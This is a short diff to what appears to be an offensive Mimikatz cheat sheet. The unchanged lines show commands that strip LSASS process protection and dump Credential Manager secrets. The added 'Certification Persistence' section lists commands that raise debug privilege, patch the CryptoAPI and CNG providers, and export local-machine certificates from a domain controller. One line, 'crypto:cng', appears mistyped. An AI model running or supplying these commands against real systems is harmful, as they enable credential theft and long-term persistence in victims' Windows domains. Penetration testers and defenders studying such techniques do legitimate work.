@@ -139,3 +139,17 @@ privilege::debug
 !processprotect /process:lsass.exe /remove
 sekurlsa::credman
 ```
+
+
+## Certification Persistence
+
+```powershell
+# View CA Certificate on the DC 
+crypto::certificates /systemstore:local_machine
+
+
+privilege::debug
+crypto::capi
+crypto:cng
+crypto::certificates /systemstore:local_machine /export
+```
